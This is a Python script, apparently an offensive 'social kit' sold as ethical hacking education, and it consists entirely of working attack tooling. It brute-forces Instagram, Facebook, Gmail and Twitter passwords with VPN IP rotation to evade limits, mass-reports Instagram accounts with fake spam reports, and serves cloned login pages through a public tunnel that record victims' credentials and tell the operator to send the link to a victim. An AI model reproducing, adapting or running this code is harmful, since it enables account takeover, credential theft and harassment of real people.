#!/usr/bin/env python3

import os, sys, time, random, platform, smtplib, subprocess, threading, re
from getpass import getpass

# Auto-install required packages
for pkg in ['requests','bs4','instaloader','rich','distro','pyfiglet','flask']:
    try: __import__(pkg)
    except: subprocess.check_call([sys.executable,'-m','pip','install',pkg])

import requests, instaloader, distro
from bs4 import BeautifulSoup
from rich.console import Console
from rich.align import Align
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from pyfiglet import figlet_format
from flask import Flask, request, render_template_string, redirect

####################
#─── UI & HELPERS ──#
####################
console = Console()
codeList = ["US","TR","CA","DE","FR","NL","GB","HK","SG"]
nu = [1,2,3,4]
CREDS_FILE = "saved_creds.txt"

def clear():
    os.system("cls" if os.name=="nt" else "clear")

def show_banner(txt="HCO-KIT", style="bold blue"):
    b = figlet_format(txt)
    console.print(Align.center(f"[{style}]{b}[/{style}]"))

def banner():
    clear()
    console.print(Align.center(f"[bold red]{figlet_format('TEAM HCO')}[/bold red]"))
    console.print(
        Panel.fit(
            "[green]This tool is for ethical hacking education only.\n"
            "[cyan]Watch full tutorial:[/cyan] [bold blue]https://youtube.com/@hackers_colony_tech[/bold blue]",
            title="[bold yellow]HCO Hackers Tool[/bold yellow]",
            border_style="magenta",
            padding=(1, 2),
        )
    )
    time.sleep(2)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech")
    Prompt.ask("[yellow]Press Enter after subscribing to continue...[/yellow]")
    clear()

def change_ip():
    c = random.choice(codeList)
    if "arch" in distro.name().lower():
        os.system("sudo systemctl start windscribe")
    os.system(f"windscribe connect {c}")

def ask_choice(title, options):
    clear(); show_banner("HCO-KIT")
    console.print( Align.center(
        Panel.fit(f"[cyan]HCO SOCIALKIT[/cyan]\nMade by [bold green]Ali Sabri[/bold green]",
        title="[bold green]WELCOME[/bold green]", border_style="cyan")
    ))
    console.print(Align.center(f":: {title} ::"), style="bold green")
    for k,v in options.items():
        console.print(Align.center(f"{k}. {v}"), style="bold yellow")
    try:
        c = int(input("\n[choice]〉 "))
        if c not in options: raise
        return c
    except:
        console.print("Invalid choice", style="bold red")
        sys.exit()

def vpn_error():
    console.print("VPN only on Linux!", style="bold red"); sys.exit()

##########################
#─── BRUTEFORCE MODULE ──#
##########################
def insta_pass(user,pwd):
    L=instaloader.Instaloader()
    try: L.login(user,pwd); return True
    except Exception as e: return "Checkpoint" in str(e)

def insta_bruteforce(user,wl,vpn):
    try: pwds=open(wl).read().splitlines()
    except: console.print("Wordlist not found!",style="bold red"); sys.exit()
    for p in pwds:
        if insta_pass(user,p):
            console.print(f"[bold green][SUCCESS][/bold green] {p}"); return
        console.print(f"[bold red][FAILED][/bold red] {p}")
        if vpn: change_ip()

def facebook_bruteforce(user,wl,vpn):
    def make_form():
        r=requests.get("https://www.facebook.com/login.php")
        cookies={c.name:c.value for c in r.cookies}
        soup=BeautifulSoup(r.text,"html.parser").form
        return {"lsd":soup.input['value'],"email":user},cookies
    try: pwds=open(wl).read().splitlines()
    except: console.print("Wordlist not found!",style="bold red"); sys.exit()
    for p in pwds:
        form,cookies=make_form(); form['pass']=p
        r=requests.post("https://www.facebook.com/login.php",data=form,cookies=cookies)
        if any(x in r.text for x in["Find Friends","Log Out","Two-factor"]):
            console.print(f"[bold green][SUCCESS][/bold green] {p}"); return
        console.print(f"[bold red][FAILED][/bold red] {p}")
        if vpn: change_ip()

def gmail_bruteforce(user,wl,vpn):
    try: pwds=open(wl).read().splitlines()
    except: console.print("Wordlist not found!",style="bold red"); sys.exit()
    for p in pwds:
        try:
            s=smtplib.SMTP("smtp.gmail.com",587); s.starttls(); s.login(user,p)
            console.print(f"[bold green][SUCCESS][/bold green] {p}"); return
        except:
            console.print(f"[bold red][FAILED][/bold red] {p}")
            if vpn: change_ip()

def twitter_bruteforce(user,wl,vpn):
    try: pwds=open(wl).read().splitlines()
    except: console.print("Wordlist not found!",style="bold red"); sys.exit()
    for p in pwds:
        r=requests.post("https://twitter.com/login/",data={
            "session[username_or_email]":user,"session[password]":p})
        if "success" in r.text:
            console.print(f"[bold green][SUCCESS][/bold green] {p}"); return
        console.print(f"[bold red][FAILED][/bold red] {p}")
        if vpn: change_ip()

##############################
#─── MASS REPORT MODULE ─────#
##############################
def insta_massreport(user,vpn,amt,_):
    for i in range(amt):
        hdr={'User-Agent':random.choice([
            'Mozilla/5.0','Chrome/90','Safari/13','Edge/85'])}
        data={'reason':'spam','target':user}
        try:
            requests.post("https://www.instagram.com/report/",headers=hdr,data=data)
            console.print(f"[{i+1}/{amt}] Reported {user}",style="bold yellow")
            if vpn: change_ip()
        except:
            console.print(f"[bold red]Report failed[/bold red]")
        time.sleep(random.choice(nu))

#########################
#─── PHISHING ENGINE ──#
#########################
app = Flask(__name__)

TEMPLATES = {
    "instagram": ("Instagram", "#3897f0"),
    "facebook":  ("Facebook", "#4267B2"),
    "gmail":     ("Gmail", "#d93025"),
    "twitter":   ("Twitter", "#1DA1F2"),
}

current_site = None

def phish_template(site):
    name,color = TEMPLATES[site]
    return f"""
    <html><head><title>{name}</title>
    <style>body{{font-family:Arial;text-align:center;padding:50px;}}
    .box{{width:300px;margin:auto;padding:20px;border:1px solid #ccc;}}
    input{{width:100%;margin:5px 0;padding:8px;}}button{{width:100%;padding:10px;
    background:{color};color:#fff;border:none;font-weight:bold;}}
    </style></head><body><div class="box">
    <h2>{name}</h2>
    <form method="POST">
      <input name="username" placeholder="Username/Email" required/>
      <input name="password" type="password" placeholder="Password" required/>
      <button>Log In</button>
    </form></div></body></html>
    """

@app.route("/", methods=["GET"])
def root_redirect():
    return redirect(f"/{current_site}/")

@app.route("/<site>/", methods=["GET","POST"])
def phish(site):
    if site not in TEMPLATES: return "Unknown",404
    if request.method=="POST":
        u = request.form.get("username","")
        p = request.form.get("password","")
        with open(CREDS_FILE,"a+") as f:
            f.write(f"{site.upper()} | {u} | {p} | {time.asctime()}\n")
        return redirect(f"https://{site}.com")
    return render_template_string(phish_template(site))

def tail_creds():
    if not os.path.exists(CREDS_FILE): open(CREDS_FILE,"w").close()
    with open(CREDS_FILE) as f:
        f.seek(0,2)
        while True:
            line = f.readline()
            if line:
                console.print(f"[bold magenta][VICTIM][/bold magenta] {line.strip()}")
            else:
                time.sleep(0.5)

def run_phish(site):
    global current_site
    current_site = site
    console.print(f"[green]Starting phishing server for {site}...[/green]")
    threading.Thread(target=lambda: app.run(host="0.0.0.0",port=8080,debug=False),daemon=True).start()
    threading.Thread(target=tail_creds,daemon=True).start()
    # start cloudflared and capture link
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8080"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    link = None
    for line in proc.stdout:
        console.print(f"[cyan]{line.strip()}[/cyan]")
        m = re.search(r"https://[^\s]+\.trycloudflare\.com", line)
        if m:
            link = m.group(0) + f"/{site}/"
            console.print(f"[bold yellow]Phishing URL → {link}[/bold yellow]")
            break
    if not link:
        console.print("[bold red]Failed to retrieve tunnel URL[/bold red]")
    console.print("[magenta]Send this link to the victim[/magenta]")
    input("[bold]ENTER to stop all…[/bold]")
    proc.terminate()
    os._exit(0)

################
#─── MAIN ────#
################
def main():
    banner(); time.sleep(1)
    choice = ask_choice("Select Platform", {1:"Instagram",2:"Facebook",3:"Gmail",4:"Twitter"})
    vpn = ask_choice("Use VPN?", {0:"No",1:"Yes"})==1
    if vpn and "Linux" not in platform.system(): vpn_error()
    attack = ask_choice("Attack Type", {1:"Bruteforce",2:"Massreport",3:"Phishing"})
    
    if attack==1:
        user = input("\n[Username/Email]〉 ")
        wl   = input("\n[Wordlist path]〉 ")
        funcs = {1:insta_bruteforce,2:facebook_bruteforce,3:gmail_bruteforce,4:twitter_bruteforce}
        funcs[choice](user,wl,vpn)
    elif attack==2:
        user = input("\n[Target Username]〉 ")
        amt  = int(input("\n[Report Amount]〉 "))
        if choice==1: insta_massreport(user,vpn,amt,1)
        else: console.print("Massreport only on IG",style="bold red")
    else:
        sites = {1:"instagram",2:"facebook",3:"gmail",4:"twitter"}
        run_phish(sites[choice])

if __name__=="__main__":
    main()
